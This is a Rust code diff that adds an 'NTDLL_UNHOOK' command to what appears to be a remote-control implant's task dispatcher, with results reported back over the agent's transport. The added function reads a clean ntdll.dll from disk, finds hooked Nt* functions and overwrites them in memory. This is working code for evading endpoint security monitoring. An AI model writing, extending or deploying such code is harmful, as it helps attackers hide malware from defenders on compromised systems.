@@ -457,6 +457,78 @@ fn drives() -> String {
     }
 }
 
+// ── NTDLL_UNHOOK ─────────────────────────────────────────────────────────────
+
+unsafe fn ntdll_unhook() -> String {
+    use windows_sys::Win32::System::LibraryLoader::{
+        LoadLibraryExW, LOAD_LIBRARY_AS_DATAFILE,
+    };
+    use windows_sys::Win32::Foundation::FreeLibrary;
+    use windows_sys::Win32::System::SystemServices::{
+        IMAGE_DOS_HEADER, IMAGE_EXPORT_DIRECTORY,
+    };
+    use windows_sys::Win32::System::Diagnostics::Debug::IMAGE_NT_HEADERS64;
+
+    let ntdll_w: Vec<u16> = "ntdll.dll\0".encode_utf16().collect();
+
+    // Get the loaded ntdll base
+    let loaded = GetModuleHandleW(ntdll_w.as_ptr()) as usize;
+    if loaded == 0 {
+        return "[!] GetModuleHandleW(ntdll) failed".to_string();
+    }
+
+    // Load a fresh clean copy from disk as a data file (not executed)
+    let clean_raw = LoadLibraryExW(ntdll_w.as_ptr(), 0, LOAD_LIBRARY_AS_DATAFILE) as usize;
+    if clean_raw == 0 {
+        return "[!] LoadLibraryExW(ntdll, DATAFILE) failed".to_string();
+    }
+
+    // LOAD_LIBRARY_AS_DATAFILE sets the low two bits — mask them to get the real base
+    let clean_base = clean_raw & !0x3_usize;
+
+    let dos = &*(loaded as *const IMAGE_DOS_HEADER);
+    let nt  = &*((loaded + dos.e_lfanew as usize) as *const IMAGE_NT_HEADERS64);
+    let exp_rva = nt.OptionalHeader.DataDirectory[0].VirtualAddress as usize;
+    if exp_rva == 0 {
+        FreeLibrary(clean_raw as isize);
+        return "[!] no export directory".to_string();
+    }
+    let exp = &*((loaded + exp_rva) as *const IMAGE_EXPORT_DIRECTORY);
+    let n_funcs   = exp.NumberOfNames as usize;
+    let names_arr = (loaded + exp.AddressOfNames as usize) as *const u32;
+    let ords_arr  = (loaded + exp.AddressOfNameOrdinals as usize) as *const u16;
+    let fns_arr   = (loaded + exp.AddressOfFunctions as usize) as *const u32;
+
+    let mut unhooked = 0u32;
+
+    for i in 0..n_funcs {
+        let name_rva = *names_arr.add(i) as usize;
+        let name_ptr = (loaded + name_rva) as *const u8;
+        // Only process Nt* exports
+        if *name_ptr != b'N' || *name_ptr.add(1) != b't' { continue; }
+
+        let ord     = *ords_arr.add(i) as usize;
+        let fn_rva  = *fns_arr.add(ord) as usize;
+        let fn_ptr  = (loaded + fn_rva) as *mut u8;
+
+        // Detect hook: JMP (E9), CALL (E8), INT3 (CC)
+        let first = *fn_ptr;
+        if first != 0xE9 && first != 0xE8 && first != 0xCC { continue; }
+
+        let clean_ptr = (clean_base + fn_rva) as *const u8;
+
+        let mut old: u32 = 0;
+        if VirtualProtect(fn_ptr as *mut _, 16, PAGE_EXECUTE_READWRITE, &mut old) != 0 {
+            std::ptr::copy_nonoverlapping(clean_ptr, fn_ptr, 16);
+            VirtualProtect(fn_ptr as *mut _, 16, old, &mut old);
+            unhooked += 1;
+        }
+    }
+
+    FreeLibrary(clean_raw as isize);
+    format!("[+] unhooked {} Nt* functions", unhooked)
+}
+
 // ── Dispatcher ───────────────────────────────────────────────────────────────
 
 /// Returns true if the task type was handled here, false to let the caller
@@ -552,6 +624,12 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) -> bool {
 
         "DRIVES" => {
             t.send_result(task.id, &drives(), "");
+            true
+        }
+
+        "NTDLL_UNHOOK" => {
+            let r = unsafe { ntdll_unhook() };
+            t.send_result(task.id, &r, "");
             true
         }
 
